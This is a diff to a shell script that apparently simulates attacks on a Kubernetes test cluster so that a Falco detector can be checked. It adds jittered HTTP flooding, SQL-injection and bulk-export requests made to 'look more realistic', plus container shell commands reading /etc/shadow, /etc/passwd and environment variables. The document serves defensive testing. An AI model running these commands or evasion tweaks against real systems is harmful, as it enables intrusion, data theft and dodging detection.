@@ -124,6 +124,7 @@ run_http_attacks() {
     python - <<'PY' >/dev/null || true
 import asyncio
 import os
+import random
 import time
 
 import httpx
@@ -145,10 +146,12 @@ async def ddos() -> None:
     async with httpx.AsyncClient(timeout=2.0) as client:
         sent = 0
         while time.time() < end:
-            tasks = [client.get(url, params={"frame_id": sent + i}) for i in range(60)]
+            # Burst windows + jitter look more realistic than fixed-rate loops.
+            burst = random.choice([18, 24, 32, 48, 60]) if mode == "all" else random.choice([30, 45, 60])
+            tasks = [client.get(url, params={"frame_id": sent + i, "client": f"cam{(sent+i)%7}"}) for i in range(burst)]
             await asyncio.gather(*tasks, return_exceptions=True)
-            sent += 60
-            await asyncio.sleep(0.2)
+            sent += burst
+            await asyncio.sleep(random.uniform(0.15, 0.9))
 
 
 async def sqli() -> None:
@@ -165,11 +168,12 @@ async def sqli() -> None:
         while time.time() < end:
             p = payloads[n % len(payloads)]
             try:
-                await client.post(url, json={"patient_id": p, "query": p})
+                # Blend obvious payloads with benign-looking keys and jittered timing.
+                await client.post(url, json={"patient_id": p, "query": p, "client_ref": f"mobile-{n%5}", "trace": str(n)})
             except Exception:
                 pass
             n += 1
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(random.uniform(0.08, 0.6))
 
 
 async def exfil() -> None:
@@ -180,11 +184,16 @@ async def exfil() -> None:
             try:
                 await client.get(
                     url,
-                    params={"action": "export_all", "format": "csv", "include_sensitive": "true"},
+                    params={
+                        "action": "export_all",
+                        "format": random.choice(["csv", "json"]),
+                        "include_sensitive": "true",
+                        "session": f"gw-{random.randint(100,999)}",
+                    },
                 )
             except Exception:
                 pass
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(random.uniform(0.3, 1.4))
 
 
 async def unauthorized() -> None:
@@ -196,11 +205,12 @@ async def unauthorized() -> None:
     end = time.time() + duration
     async with httpx.AsyncClient(timeout=3.0) as client:
         while time.time() < end:
+            batch = random.sample(targets, k=random.randint(1, len(targets)))
             await asyncio.gather(
-                *[client.get(t, headers={"Authorization": "Bearer invalid"}) for t in targets],
+                *[client.get(t, headers={"Authorization": random.choice(['Bearer invalid','Bearer expired',''])}) for t in batch],
                 return_exceptions=True,
             )
-            await asyncio.sleep(0.3)
+            await asyncio.sleep(random.uniform(0.2, 1.0))
 
 
 async def main() -> None:
@@ -232,19 +242,30 @@ run_runtime_attacks() {
     i=$((i+1))
     # Privilege escalation-ish behavior: spawn shell and read sensitive files
     if [[ "$MODE" == "all" || "$MODE" == "privesc" ]]; then
-      kubectl exec -n "$NAMESPACE" deploy/healthcare-api -- /bin/sh -lc 'id; uname -a; cat /etc/shadow >/dev/null 2>&1 || true; cat /etc/passwd >/dev/null 2>&1 || true' >/dev/null 2>&1 || true
+      kubectl exec -n "$NAMESPACE" deploy/healthcare-api -- /bin/sh -lc '
+        id; uname -a;
+        cat /etc/shadow >/dev/null 2>&1 || true;
+        cat /etc/passwd >/dev/null 2>&1 || true;
+        test -f /usr/bin/curl && curl -s http://parking-system-service/api/gateway >/dev/null 2>&1 || true;
+        test -f /usr/bin/wget && wget -qO- http://traffic-camera-service/health >/dev/null 2>&1 || true
+      ' >/dev/null 2>&1 || true
     fi
 
     # Exfil-ish behavior: list /tmp and read common files
     if [[ "$MODE" == "all" || "$MODE" == "exfil" ]]; then
-      kubectl exec -n "$NAMESPACE" deploy/parking-system -- /bin/sh -lc 'ls -la /tmp >/dev/null 2>&1 || true; cat /etc/passwd >/dev/null 2>&1 || true' >/dev/null 2>&1 || true
+      kubectl exec -n "$NAMESPACE" deploy/parking-system -- /bin/sh -lc '
+        ls -la /tmp >/dev/null 2>&1 || true;
+        cat /etc/passwd >/dev/null 2>&1 || true;
+        env | head -5 >/dev/null 2>&1 || true;
+        (which apt-get && apt-get --version >/dev/null 2>&1) || (which apk && apk --version >/dev/null 2>&1) || true
+      ' >/dev/null 2>&1 || true
     fi
 
     # Noise in traffic-camera
     if [[ "$MODE" == "all" || "$MODE" == "ddos" ]]; then
       kubectl exec -n "$NAMESPACE" deploy/traffic-camera -- /bin/sh -lc 'echo probe >/dev/null' >/dev/null 2>&1 || true
     fi
-    sleep 2
+    sleep $(( (RANDOM % 3) + 1 ))
   done
 }
 
@@ -264,6 +285,7 @@ if [[ "$EXPLAIN" == "1" ]]; then
   echo "What this simulates:"
   echo "  - suspicious shell commands inside service containers"
   echo "  - reads of sensitive files (/etc/passwd, /etc/shadow)"
+  echo "  - operator-tooling behavior (curl/wget/package-manager probes)"
   echo "Expected detector: Falco (runtime/eBPF syscall monitoring)"
 fi
 run_runtime_attacks "$DURATION"
